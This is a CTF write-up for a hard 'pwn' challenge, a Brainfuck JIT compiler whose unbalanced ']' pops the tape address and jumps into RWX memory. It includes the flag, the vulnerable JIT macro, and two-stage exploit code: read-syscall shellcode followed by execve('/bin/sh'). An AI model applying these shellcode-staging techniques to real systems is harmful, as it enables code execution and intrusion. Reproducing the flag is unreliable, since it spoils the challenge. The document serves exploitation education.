---
ctf: VUWCTF 2025
category: pwn
difficulty: hard
points: 475
flag: "VuwCTF{rU5tac3Ans_uN1te_agA1n5t_uN5aFe_l4ngUaG3s}"
techniques: [brainfuck_jit, unbalanced_brackets, rwx_memory, shellcode]
tools: [pwntools]
---

# Blazingly Fast Memory Unsafe

## Description
A Brainfuck JIT compiler with an unbalanced bracket vulnerability allowing arbitrary code execution.

## Vulnerability

The `]` (LOOP_END) instruction pops a return address from the stack and jumps to it if the current cell is non-zero. Unbalanced `]` without matching `[` pops values pushed during PROLOGUE - specifically the tape address, which resides in RWX memory.

## Solution

### Exploit Strategy

1. **Stage 1**: Write shellcode to tape using BF `+/-` operations, then trigger jump with `]`
2. **Stage 2**: Stage 1 calls `read(0, tape, 256)` to load execve shellcode from stdin

### Key Constraint
Max input: 512 bytes. **Optimization**: use `-` for bytes >127 (e.g., 0xff costs 1 `-` instead of 255 `+`).

### Final Payload

**JIT LOOP_END Implementation (The Bug):**
```c
#define LOOP_END (x64Ins[]) { \
    { MOV, rax, m64($rbp, -8) }, \
    { POP, rbx },              /* pops tape addr if no matching '[' */ \
    { CMP, m8($rax), imm(0) }, \
    { JZ, rel(2) }, \
    { JMP, rbx }               /* jumps to tape! */ \
}
```

**Exploit Code:**
```python
# Stage 1: read(0, tape, 256) - 10 bytes, 508 BF chars
stage1 = asm("""
    mov edx, esi   # rdx = 256 (from rsi after PROLOGUE)
    push rdi       # save tape addr
    pop rsi        # rsi = tape
    xor eax, eax   # rax = 0 (read syscall)
    sub edi, edi   # rdi = 0 (stdin)
    syscall
""")

# Stage 2: jmp prefix + execve("/bin/sh")
stage2 = b'\xeb\x08' + b'\x90'*8 + execve_shellcode
```

##Key Techniques
- Brainfuck JIT compiler exploitation
- Unbalanced bracket stack manipulation
- Staged shellcode injection
- RWX memory code execution
- Byte optimization for size constraints
